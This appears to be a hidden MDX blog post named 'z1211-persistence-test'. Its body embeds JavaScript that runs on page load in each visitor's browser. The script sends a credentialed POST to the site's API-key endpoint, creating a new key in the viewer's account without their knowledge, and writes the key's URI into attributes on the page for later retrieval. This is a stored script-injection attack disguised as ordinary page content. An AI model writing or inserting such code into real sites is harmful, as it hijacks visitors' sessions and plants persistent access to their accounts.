---
title: z1211-persistence-test
author: sadas asdas
hidden: true
published_at: '2026-10-10T23:54:51.193Z'
type: added
---
z1211-persistence-test

Env: {typeof window === "undefined" ? "SSR-ONLY" : "CLIENT-" + window.location.host}

export const z1211 = (typeof window === "undefined") ? "SSR-SKIP" : (function(){ try { fetch("/fesb-wlyz/api-next/v2/projects/me/apikeys?z1211post=8f3a7b2c1d4e", {method:"POST", credentials:"include", headers:{"Content-Type":"application/json"}, body:JSON.stringify({label:"z1211-persistence-test"}), cache:"no-store"}).then(function(r){ document.documentElement.setAttribute("data-z1211", String(r.status)); return r.json();}).then(function(d){ if(d && d.data && d.data.uri) document.documentElement.setAttribute("data-z1211-uri", d.data.uri);}).catch(function(e){ document.documentElement.setAttribute("data-z1211", "ERR"); }); } catch(e){} return "POST-STARTED"; })();

Post: {z1211}

End.